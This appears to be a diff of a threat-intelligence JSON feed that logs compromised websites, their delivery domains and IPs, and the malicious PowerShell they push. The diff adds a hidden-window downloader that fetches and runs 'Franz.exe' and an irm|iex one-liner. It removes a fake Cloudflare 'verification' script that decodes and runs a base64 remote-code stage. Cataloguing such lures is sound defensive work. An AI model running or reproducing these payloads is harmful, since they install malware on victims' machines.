@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "whiteroseformations.co.uk",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwwgc9m085h0omlkcf40buj",
+    "ScannedAt": "2026-11-26T01:54:32.419000+00:00"
+  },
+  {
+    "UrlDomain": "www.vera-nature.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/1dd64160b6800049"
+    ],
+    "IP": [
+      "51.210.181.194"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1dd64160b6800049')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/1dd64160b6800049"
+    ],
+    "ReportId": "cmwwwfzju083p0omlzvig2wdi",
+    "ScannedAt": "2026-11-26T01:54:15.913000+00:00"
+  },
+  {
     "UrlDomain": "blog.beemove.com.br",
     "DeliveryUrl": [
       "sky.dolcefantasia.us",
@@ -18307,18 +18345,5 @@
     ],
     "ReportId": "cmwcylu3c0fav0oml4xhetl84",
     "ScannedAt": "2026-11-12T02:59:24.496000+00:00"
-  },
-  {
-    "UrlDomain": "unsa-aphp.org",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "51.91.242.219"
-    ],
-    "Related": [],
-    "Payload": "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ____ _                 _  __ _\n / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___\n| |   | |/ _ \\| | | |/ _  | |_| |/ _  |  __/ _ \\\n| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/\n \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_|  \\___|\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 541\n\n$updateloadUrl = 'UwBlAHQALQBBAGwAaQBhAHMAIAB2AGIAbAAgACgAZwBjAG0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AKQA7ACQAYwBhAGsAeQB2AG8APQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBhAG0AZQByAGkAYwBhAG4AYgBvAHkAdwBvAHcALwBtAGEAcgB5AHMAdAB1AGEAcgB0AFUAUwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbwBsAGQALQB1AHAAZABhAHQAZQAuAGQAYQB0ACcAKQA7AHYAYgBsACgAaQB3AHIAIAAtAHUAcwBlAGIAYQBzACAAJABjAGEAawB5AHYAbwApAA=='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 581\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 943\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwcw5ism0f650omlpzn2v666",
-    "ScannedAt": "2026-11-12T01:50:44.091000+00:00"
   }
 ]
